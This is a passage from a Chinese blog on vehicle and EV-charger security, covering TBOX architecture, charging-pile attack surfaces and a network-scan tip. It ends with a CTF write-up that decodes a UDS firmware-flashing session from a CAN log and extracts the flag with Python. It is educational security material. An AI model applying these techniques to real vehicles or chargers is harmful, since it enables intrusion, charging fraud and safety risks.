<li><p>信息娱乐系统(IVI)：IVI：早期以CD机的形式进行音频播放，在车联网功能推广后，目前的车载娱乐系统可以通过蜂窝网络接入互联网，并提供以下常见功能：实时导航，网页浏览，视频播放，手机投屏，语音控车等。车载信息娱乐系统通常具备一部分CAN总线操控能力，因此车载信息娱乐系统”功能外溢”现象产生的攻击面很可能会导致控车漏洞的产生。</p>
</li>
<li><p>车载网关(TBOX)：车载网关(Telematics BOX)。负责车机内部的以太网通信，同时提供联网能力，实现车端与云平台(TSP)的远程长连接。T-BOX具备一定CAN总线的能力，也是数字钥匙(手机控车)的实现载体。通过数字钥匙，用户可以通过手机对车辆进行远程操控(云钥匙)或者近场操控(蓝牙钥匙，NFC钥匙)。其中云钥匙的实现架构如下图所示：</p>
</li>
<li><p>手机端车联网应用(APP)：手机端车联网应用程序。多数车联网汽车厂商会向车主提供车联网应用程序，此类APP通常具备以下功能: 车主服务，应用商城，远程控车等。</p>
</li>
<li><p>车联网云平台服务(TSP)：车载信息服务提供商(TelematicsServiceProvider)。在车联网系统中以云的形式向用户侧与车辆侧提供以下服务：用户信息维护，车辆定位，状态监控等。</p>
</li>
</ul>
<p>攻击路径：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
<p>车联网安全风险：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230709153558408.png" alt="image-20230709153558408"></p>
<p>OBD:<em>On-Board Diagnostics</em></p>

        <h2 id="2-TBOX安全"   >
          <a href="#2-TBOX安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-TBOX安全" class="headerlink" title="2.TBOX安全"></a>2.TBOX安全</h2>
      <p><code>TBOX</code>通常是汽车用于联网的模块，又叫T盒、车载无线终端等，国外也称之为<code>TSP(Telematics Control Unit)</code>远程信息控制单元。上端与<code>TSP(Telematics Services Provider)</code>服务器相连，下端与<code>CAN</code>总线等其他汽车模块相连。通常会提供远程控制、车辆故障诊断、OTA升级、网络共享、蓝牙钥匙、载荷分析等功能</p>

        <h3 id="1-基础概念"   >
          <a href="#1-基础概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-基础概念" class="headerlink" title="(1)基础概念"></a>(1)基础概念</h3>
      
        <h4 id="TBOX接口"   >
          <a href="#TBOX接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#TBOX接口" class="headerlink" title="TBOX接口"></a>TBOX接口</h4>
      <p>通常可以分为三种，分别为天线、通信接口以及电源</p>
<ul>
<li>天线：蜂窝网络天线、WI-FI天线、GNSS天线、FM广播天线、蓝牙天线等</li>
<li>接口：USB、Ethernet、CAN、UART等</li>
</ul>
<p>通常来说接口有一定的特征，比如天线一般采用<code>FAKRA(FAchKReis Automobil)</code>连接器，这种连接器一般采用同轴电缆、单线单芯。此外颜色通常也有一定特征，比如蓝色用于GNSS、紫色用于蜂窝网络等</p>
<p><code>USB</code>一般采用<code>HSD(High-Speed Data)</code>连接器，该接口常用于信息娱乐模块和显示装置。</p>

        <h4 id="TBOX结构"   >
          <a href="#TBOX结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#TBOX结构" class="headerlink" title="TBOX结构"></a>TBOX结构</h4>
      <p>一般分为两种结构，一种是<code>SoC</code>和通信模组分离，一种是<code>SoC</code>和通信模组集成在一块。</p>

        <h4 id="SIM卡"   >
          <a href="#SIM卡" class="heading-link"><i class="fas fa-link"></i></a><a href="#SIM卡" class="headerlink" title="SIM卡"></a>SIM卡</h4>
      <p>大部分的<code>TBOX</code>采用<code>eSIM</code>卡（电子化的SIM卡），也有普通的<code>SIM</code>卡</p>

        <h4 id="MCU"   >
          <a href="#MCU" class="heading-link"><i class="fas fa-link"></i></a><a href="#MCU" class="headerlink" title="MCU"></a>MCU</h4>
      <p>一般<code>TBOX</code>上有一个<code>MCU</code>机械控制单元，负责与<code>CAN</code>总线进行通信</p>

        <h3 id="2-TBOX安全威胁"   >
          <a href="#2-TBOX安全威胁" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-TBOX安全威胁" class="headerlink" title="(2)TBOX安全威胁"></a>(2)TBOX安全威胁</h3>
      <p>一般的威胁有调试接口、固件提取、车联网服务平台（伪装成TBOX向云端发起攻击）、公网暴露（一些开启了Telnet的TBOX开放在云端）、CAN总线、协议安全</p>

        <h3 id="3-TBOX使用"   >
          <a href="#3-TBOX使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-TBOX使用" class="headerlink" title="(3)TBOX使用"></a>(3)TBOX使用</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230913170516.jpg" alt="微信图片_20230913170516"></p>
<p>如上TBOX的信息，分析可得为奔驰汽车，制造商为Harman，型号（Model）为<code>HERMES 1.5 CN</code>。通信方面可知，有蓝牙标签、WIFI模块<code>WLAN-MAC:746FF7091E2E</code>。</p>
<p>右侧的进网许可也可以在网络上进行查询。</p>

        <h3 id="4-设备上电"   >
          <a href="#4-设备上电" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-设备上电" class="headerlink" title="(4)设备上电"></a>(4)设备上电</h3>
      <p>实际摸索把</p>

        <h3 id="5-寻找入口"   >
          <a href="#5-寻找入口" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-寻找入口" class="headerlink" title="(5)寻找入口"></a>(5)寻找入口</h3>
      <p>调试接口，实际摸索</p>

        <h1 id="充电桩安全"   >
          <a href="#充电桩安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#充电桩安全" class="headerlink" title="充电桩安全"></a>充电桩安全</h1>
      
        <h2 id="基础知识"   >
          <a href="#基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2>
      <p>充电桩由<code>TCU(Traiff and Control Unit)</code>计费控制单元、充电主控模块、功率控制模块、开关电源等等部分组成</p>

        <h3 id="接口"   >
          <a href="#接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#接口" class="headerlink" title="接口"></a>接口</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230914110640.jpg" alt="微信图片_20230914110640"></p>

        <h3 id="架构"   >
          <a href="#架构" class="heading-link"><i class="fas fa-link"></i></a><a href="#架构" class="headerlink" title="架构"></a>架构</h3>
      <p>如上图所示，通常存在多种接口，包括<code>CAN</code>、串口、<code>SIM</code>卡槽等等，可以通过这些接口与其进行交互，常见的<code>TCU</code>架构如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230914110947544.png" alt="image-20230914110947544"></p>

        <h3 id="充电插头"   >
          <a href="#充电插头" class="heading-link"><i class="fas fa-link"></i></a><a href="#充电插头" class="headerlink" title="充电插头"></a>充电插头</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230914111233.jpg" alt="微信图片_20230914111233"></p>
<p>其中相关的定义如下</p>
<div class="table-container"><table>
<thead>
<tr>
<th>触头编号/标识</th>
<th>额定电压和额定电流</th>
<th>功能定义</th>
</tr>
</thead>
<tbody><tr>
<td>DC+</td>
<td>750V/1000V  80A/125A/200A/250A</td>
<td>直流电源正极，连接直流电源正极与电池正极</td>
</tr>
<tr>
<td>DC-</td>
<td>750V/1000V  80A/125A/200A/250A</td>
<td>直流电源负极，连接直流电源负极与电池负极</td>
</tr>
<tr>
<td>PE</td>
<td>—–</td>
<td>保护接地，连接供电设备地线和车辆电平台</td>
</tr>
<tr>
<td>S+</td>
<td>0~330V 2A</td>
<td>充电通信CAN_H，连接非车载充电机与电动汽车的通信线</td>
</tr>
<tr>
<td>S-</td>
<td>0~330V 2A</td>
<td>充电通信CAN_L，连接非车载充电机与电动汽车的通信线</td>
</tr>
<tr>
<td>CC1</td>
<td>0~330V 2A</td>
<td>充电连接确认</td>
</tr>
<tr>
<td>CC2</td>
<td>0~330V 2A</td>
<td>充电连接确认</td>
</tr>
<tr>
<td>A+</td>
<td>0~330V 20A</td>
<td>低压辅助电源正，连接非车载充电机为电动汽车提供的低压辅助电源</td>
</tr>
<tr>
<td>A-</td>
<td>0~330V 20A</td>
<td>低压辅助电源负，连接非车载充电机为电动汽车提供的低压辅助电源</td>
</tr>
</tbody></table></div>

        <h3 id="充电协议"   >
          <a href="#充电协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#充电协议" class="headerlink" title="充电协议"></a>充电协议</h3>
      <p>充电机与电池管理系统<code>BMS(Battery Management System)</code>进行通信时基于<code>CAN</code>通信协议，速率为<code>250kbit/s</code>，使用29bit标识符的<code>CAN</code>扩展帧，通信地址固定，无法更改。充电机地址<code>86(0x56)</code>，<code>BMS</code>地址<code>244(F4)</code></p>
<p>可见<code>GBT-27930-2015</code>标准规定的具体内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230914140412675.png" alt="image-20230914140412675"></p>

        <h2 id="安全风险"   >
          <a href="#安全风险" class="heading-link"><i class="fas fa-link"></i></a><a href="#安全风险" class="headerlink" title="安全风险"></a>安全风险</h2>
      <p>主要有一下几个方面</p>
<ul>
<li>调试接口：常见的接口测试</li>
<li>开放服务漏洞：FTP、SSH弱口令等</li>
<li>固件漏洞：提取固件之后分析硬编码、算法等等</li>
<li>CPU卡：监听串口数据，获取用户卡片加密密码等</li>
<li>BMS通信协议：伪造充电报文、伪装其他用户充电</li>
<li>通信协议：充电桩与主站之间采用MQTT协议，可能存在潜在的漏洞</li>
</ul>

        <h2 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2>
      <p>实际上测试的时候，由于充电桩使用静态IP，那么电脑与充电桩直连时，无法获取有效的IP，可以用<code>netdiscover</code>命令进行扫描，对应命令为<code>netdiscover -r 192.168.1.1/16</code>扫描整个网段即可发现充电桩的相关<code>IP</code>。</p>

        <h1 id="CTF题目"   >
          <a href="#CTF题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1>
      
        <h2 id="2020网鼎Teslaaaaa"   >
          <a href="#2020网鼎Teslaaaaa" class="heading-link"><i class="fas fa-link"></i></a><a href="#2020网鼎Teslaaaaa" class="headerlink" title="2020网鼎Teslaaaaa"></a>2020网鼎Teslaaaaa</h2>
      <p>拿到<code>ecu_can_log.asc</code>文件，是<code>can</code>信息内容，可以用<code>savvycan</code>打开查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913090346445.png" alt="image-20230913090346445"></p>
<p>接下来一步一步分析</p>

        <h3 id="第一步-请求进入编程会话"   >
          <a href="#第一步-请求进入编程会话" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一步-请求进入编程会话" class="headerlink" title="第一步/请求进入编程会话"></a>第一步/请求进入编程会话</h3>
      <p><code>10 02</code>进入诊断控制会话，请求进入编程会话</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.498709 1  7DF             Tx   d 8 02 10 02 AA AA AA AA AA</span><br><span class="line">9.499693 1  7B0             Rx   d 8 06 50 02 00 32 01 F4 00</span><br></pre></td></tr></table></div></figure>

<p>正反馈<code>06 50</code>，允许进入</p>

        <h3 id="第二步-请求27种子"   >
          <a href="#第二步-请求27种子" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二步-请求27种子" class="headerlink" title="第二步/请求27种子"></a>第二步/请求27种子</h3>
      <p>请求<code>27</code>安全访问，请求种子，对应子服务为<code>05</code>，即<code>27 05</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.740585 1  730             Tx   d 8 02 27 05 AA AA AA AA AA</span><br><span class="line">9.741697 1  7B0             Rx   d 8 06 67 05 11 22 33 44 00</span><br></pre></td></tr></table></div></figure>

<p>正反馈<code>06 67 05</code>，返回种子信息，对应种子信息为<code>11 22 33 44</code>，大端序，对应<code>0x11223344</code></p>

        <h3 id="第三步-计算密钥进入27服务"   >
          <a href="#第三步-计算密钥进入27服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三步-计算密钥进入27服务" class="headerlink" title="第三步/计算密钥进入27服务"></a>第三步/计算密钥进入27服务</h3>
      <p>通过种子计算，使用双方约定算法计算密钥，发送密钥，对应子服务为<code>06</code>，尝试进入<code>27</code>服务</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9.782739 1  730             Tx   d 8 06 27 06 EE DD CC BB AA</span><br><span class="line">9.783703 1  7B0             Rx   d 8 02 67 06 00 00 00 00 00</span><br></pre></td></tr></table></div></figure>

<p>依据密钥<code>0xEEDDCCBB</code>，响应正反馈<code>67 06</code>，允许进入<code>27</code>服务</p>

        <h3 id="第四步-31例程控制，擦除Flash"   >
          <a href="#第四步-31例程控制，擦除Flash" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四步-31例程控制，擦除Flash" class="headerlink" title="第四步/31例程控制，擦除Flash"></a>第四步/31例程控制，擦除Flash</h3>
      <p>进入<code>27</code>服务后，发送多帧数据，请求擦除<code>Flash</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9.788131 1  730             Tx   d 8 10 0D 31 01 FF 00 44 08</span><br><span class="line">9.788431 1  7B0             Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">9.788947 1  730             Tx   d 8 21 00 00 00 00 00 20 00</span><br><span class="line">9.789707 1  7B0             Rx   d 8 05 71 01 FF 00 00 00 00</span><br></pre></td></tr></table></div></figure>

<ul>
<li>第一帧：<code>10 0D</code>，代表多帧数据首帧，数据字节数为<code>0xD</code>个字节，后面的<code>31 01 FF 00 44 08</code>即为首帧数据。</li>
<li>第二帧：车机返回数据，<code>30 08 00...00</code>，代表多帧数据中控制速率的帧，不用解析</li>
<li>第三帧：<code>21</code>中的<code>2</code>代表为多帧数据中的一个帧，<code>1</code>代表为多帧数据中首帧之后的第一个数据帧，传输数据为<code>00 00 00 00 00 20 00</code></li>
<li>第四帧：车机返回数据，<code>05 71 01 FF 00 00</code>，代表针对<code>31 01 FF 00</code>服务的正反馈</li>
</ul>
<p>总的传输数据为<code>31 01 FF 00 44 08 00 00 00 00 00 20 00</code>，</p>
<ul>
<li><code>31 01 FF 00</code>其中<code>31</code>为<code>RoutineControl (0x31) </code>服务，表示客户端用于执行一系列定义的步骤并获取相关结果，在<code>UDS</code>诊断协议一节中有对应表格解释。<code>01</code>为<code>routineControlType RoutineControl Request SID := startRoutine</code>代表例程控制类型，为启动例程，对应还有<code>02</code>停止例程，<code>03</code>请求例程结果。<code>FF 00</code>表示具体的例程控制服务，功能为内容擦除。详细目录可参考<code>ISO 14229-1-2020</code>中的<code>Annex F (normative) Routine functional unit data-parameter definitions</code>一节的<code>Table F.1 — routineIdentifier definition</code>，提取内容如附录所示。</li>
<li><code>0x44</code>代表后面的地址和地址字宽都是<code>4</code>字节</li>
<li><code>08 00 00 00</code>代表<code>Flash</code>擦除的起始地址为<code>0x08000000</code></li>
<li><code>00 00 20 00</code>代表需要擦除<code>0x00002000</code>个字节</li>
</ul>
<p>可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42957717/article/details/117350265" >跟我学UDS(ISO14229) ———— 0x31(RoutineControl)_小趴菜_自动驾驶搬砖人的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="第五步-34例程控制，请求下载"   >
          <a href="#第五步-34例程控制，请求下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五步-34例程控制，请求下载" class="headerlink" title="第五步/34例程控制，请求下载"></a>第五步/34例程控制，请求下载</h3>
      <p>发送多帧数据，请求下载</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9.791765 1  730             Tx   d 8 10 0B 34 00 44 08 00 00</span><br><span class="line">9.792061 1  7B0             Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">9.792625 1  730             Tx   d 8 21 00 00 00 20 00 AA AA</span><br><span class="line">9.793715 1  7B0             Rx   d 8 04 74 20 01 02 00 00 00</span><br></pre></td></tr></table></div></figure>

<p>就不逐帧解析了，服务为<code>34 00</code>，请求下载<code>ECU</code>固件，发送的多帧总数据长度为<code>0x0b</code>，总数据为<code>34 00 44 08 00 00 00 00 00 20 00</code>，即请求下载<code>ECU</code>固件到<code>0x08000000</code>地址处，总计下载<code>0x00002000</code>字节数据。</p>
<p>可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42957717/article/details/117360622" >跟我学UDS(ISO14229) ———— 0x34(RequestDownload)_小趴菜_自动驾驶搬砖人的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="第六步-36数据传输"   >
          <a href="#第六步-36数据传输" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六步-36数据传输" class="headerlink" title="第六步/36数据传输"></a>第六步/36数据传输</h3>
      <p>发送多帧数据，请求数据传输</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   9.795696 1  730             Tx   d 8 10 82 36 01 28 04 00 20</span><br><span class="line">   9.795987 1  7B0             Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">   9.796548 1  730             Tx   d 8 21 45 01 00 08 21 03 00</span><br><span class="line">   9.796790 1  730             Tx   d 8 22 08 23 03 00 08 27 03</span><br><span class="line">   9.797030 1  730             Tx   d 8 23 00 08 2B 03 00 08 2F</span><br><span class="line">.....</span><br><span class="line">   9.802931 1  7B0             Rx   d 8 02 76 01 00 00 00 00 00</span><br><span class="line">   9.804553 1  730             Tx   d 8 10 82 36 02 5F 01 00 08</span><br><span class="line">   9.804847 1  7B0             Rx   d 8 30 08 00 00 00 00 00 00</span><br><span class="line">   9.805419 1  730             Tx   d 8 21 5F 01 00 08 5F 01 00</span><br><span class="line">....</span><br></pre></td></tr></table></div></figure>

<p>服务为<code>36</code>，每次多帧传输实际数据为<code>0x80(0x82-0x02)</code>，总计传输<code>0x40(0x2000/0x80)</code>次</p>

        <h3 id="第七步-37退出数据传输服务"   >
          <a href="#第七步-37退出数据传输服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七步-37退出数据传输服务" class="headerlink" title="第七步/37退出数据传输服务"></a>第七步/37退出数据传输服务</h3>
      <p>传输数据完成后，发送<code>37 01</code>服务，退出数据传输</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.314499 1  730             Tx   d 8 02 37 01 AA AA AA AA AA</span><br><span class="line">10.315695 1  7B0             Rx   d 8 06 77 01 C6 B6 5E 10 00</span><br></pre></td></tr></table></div></figure>

<p>得到正反馈<code>06 77 01</code>，允许退出</p>

        <h3 id="第八步-31例程控制，厂商自定义功能"   >
          <a href="#第八步-31例程控制，厂商自定义功能" class="heading-link"><i class="fas fa-link"></i></a><a href="#第八步-31例程控制，厂商自定义功能" class="headerlink" title="第八步/31例程控制，厂商自定义功能"></a>第八步/31例程控制，厂商自定义功能</h3>
      <p>服务为<code>31 01 DF FF</code>，<code>0xDFFF</code>为厂商自定义服务</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.318529 1  730             Tx   d 8 04 31 01 DF FF AA AA AA </span><br><span class="line">10.319707 1  7B0             Rx   d 8 03 7F 31 78 00 00 00 00 </span><br><span class="line">10.320695 1  7B0             Rx   d 8 05 71 01 DF FF 00 00 00 </span><br></pre></td></tr></table></div></figure>

<p>这里针对<code>31 01</code>服务反馈的<code>0x7f</code>不知道什么意思，后面又正反馈了，不过不影响解题</p>

        <h3 id="第九步-31例程控制，检查编程依赖"   >
          <a href="#第九步-31例程控制，检查编程依赖" class="heading-link"><i class="fas fa-link"></i></a><a href="#第九步-31例程控制，检查编程依赖" class="headerlink" title="第九步/31例程控制，检查编程依赖"></a>第九步/31例程控制，检查编程依赖</h3>
      <p>服务为<code>31 01 FF 01</code>，检查编程依赖</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.322633 1  730             Tx   d 8 04 31 01 FF 01 AA AA AA</span><br><span class="line">10.323695 1  7B0             Rx   d 8 05 71 01 FF 01 00 00 00</span><br></pre></td></tr></table></div></figure>


        <h3 id="第十步-ECU复位"   >
          <a href="#第十步-ECU复位" class="heading-link"><i class="fas fa-link"></i></a><a href="#第十步-ECU复位" class="headerlink" title="第十步/ECU复位"></a>第十步/ECU复位</h3>
      <p>服务为<code>02 11 01</code>，对<code>ECU</code>进行复位</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.325697 1  7DF             Tx   d 8 02 11 01 AA AA AA AA AA</span><br><span class="line">10.326689 1  7B0             Rx   d 8 03 7F 11 78 00 00 00 00</span><br><span class="line">11.326752 1  7B0             Rx   d 8 02 51 01 00 00 00 00 00  </span><br></pre></td></tr></table></div></figure>

<p>中间有个拒绝复位的，不知道咱们回事，后面又正反馈了，也不影响解题</p>
<p>那么主要就是第六步中的数据传输，编写脚本进行提取，参考：CTF实战</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">frame_len = <span class="number">0</span></span><br><span class="line">frame_data = <span class="string">&quot;&quot;</span></span><br><span class="line">handled_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ecu_can_log.asc&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        data = re.findall(<span class="string">r&quot;730             Tx   d 8 10 (..) 36 .. (.. .. .. ..)&quot;</span>,line)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data):</span><br><span class="line">            frame_len = <span class="built_in">int</span>(data[<span class="number">0</span>][<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">            handled_len = <span class="number">6</span></span><br><span class="line">            frame_data += data[<span class="number">0</span>][<span class="number">1</span>] + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        data = re.findall(<span class="string">r&quot;730             Tx   d 8 2(.) (.. .. .. .. .. .. ..)&quot;</span>,line)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) <span class="keyword">and</span> frame_data:</span><br><span class="line">            left_len = frame_len - handled_len</span><br><span class="line">            <span class="keyword">if</span> left_len &gt; <span class="number">7</span>:</span><br><span class="line">                frame_data += data[<span class="number">0</span>][<span class="number">1</span>] + <span class="string">&quot; &quot;</span></span><br><span class="line">                handled_len += <span class="number">7</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                frame_data += data[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>:left_len*-<span class="number">1</span>] + <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./output.bin&quot;</span>,<span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>.fromhex(frame_data.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br></pre></td></tr></table></div></figure>

<p>最后得到<code>output.bin</code>文件，放入<code>IDA</code>进行解析，设置<code>arm</code>小端序格式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913151525141.png" alt="image-20230913151525141"></p>
<p>随后设置<code>ROM</code>和<code>Input file</code>起始地址为<code>0x08000000</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913151636812.png" alt="image-20230913151636812"></p>
<p>进入分析之后，按下<code>Alt + g</code>进行指令格式修改，设置如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913151725568.png" alt="image-20230913151725568"></p>
<p>随后按<code>c</code>转为代码即可正常逆向，<code>0x08000000</code>为起始地址及函数，可以从这开始分析，查找字符串即可看到<code>flag</code>，但是不是最终的，需要进入函数进行分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913151820185.png" alt="image-20230913151820185"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913155213705.png" alt="image-20230913155213705"></p>
<p>在如下函数进行修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230913155244062.png" alt="image-20230913155244062"></p>
<p>最终得到<code>flag</code>，那么提取出来计算一下就行。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ori_flag = <span class="string">&quot;canoecr7-zd9h-1emi-or8m-f8vm2od81nfk&quot;</span></span><br><span class="line">ori_flag = <span class="built_in">list</span>(ori_flag)</span><br><span class="line">a1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ori_flag:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    a1.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line">a1[<span class="number">2</span>] -= <span class="number">13</span></span><br><span class="line">a1[<span class="number">11</span>] -= <span class="number">5</span></span><br><span class="line">a1[<span class="number">15</span>] -= <span class="number">44</span></span><br><span class="line">a1[<span class="number">3</span>] -= <span class="number">11</span></span><br><span class="line">a1[<span class="number">5</span>] -= <span class="number">48</span></span><br><span class="line">a1[<span class="number">7</span>] += <span class="number">43</span></span><br><span class="line">a1[<span class="number">28</span>] += <span class="number">50</span></span><br><span class="line">a1[<span class="number">31</span>] += <span class="number">46</span></span><br><span class="line">a1[<span class="number">19</span>] -= <span class="number">13</span></span><br><span class="line">a1[<span class="number">20</span>] -= <span class="number">66</span></span><br><span class="line">a1[<span class="number">1</span>] += <span class="number">3</span></span><br><span class="line">a1[<span class="number">29</span>] -= <span class="number">55</span></span><br><span class="line">a1[<span class="number">24</span>] -= <span class="number">51</span></span><br><span class="line">a1[<span class="number">9</span>] -= <span class="number">23</span></span><br><span class="line">a1[<span class="number">25</span>] -= <span class="number">6</span></span><br><span class="line">a1[<span class="number">27</span>] -= <span class="number">60</span></span><br><span class="line">a1[<span class="number">4</span>] -= <span class="number">52</span></span><br><span class="line">a1[<span class="number">6</span>] -= <span class="number">14</span></span><br><span class="line">a1[<span class="number">30</span>] -= <span class="number">52</span></span><br><span class="line">a1[<span class="number">22</span>] -= <span class="number">58</span></span><br><span class="line">a1[<span class="number">12</span>] -= <span class="number">48</span></span><br><span class="line">a1[<span class="number">16</span>] -= <span class="number">56</span></span><br><span class="line">a1[<span class="number">34</span>] -= <span class="number">53</span></span><br><span class="line">a1[<span class="number">0</span>] -= <span class="number">48</span></span><br><span class="line">a1[<span class="number">14</span>] += <span 